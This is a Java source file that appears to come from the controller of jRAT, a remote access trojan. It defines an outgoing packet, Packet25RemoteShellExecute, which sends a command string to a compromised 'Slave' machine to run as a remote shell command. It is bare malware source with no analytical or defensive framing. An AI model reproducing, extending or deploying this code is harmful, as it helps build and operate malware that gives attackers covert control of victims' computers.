package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet25RemoteShellExecute implements OutgoingPacket {

	private String command;

	public Packet25RemoteShellExecute(String command) {
		this.command = command;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeLine(command);
	}

	@Override
	public short getPacketId() {
		return 25;
	}

}
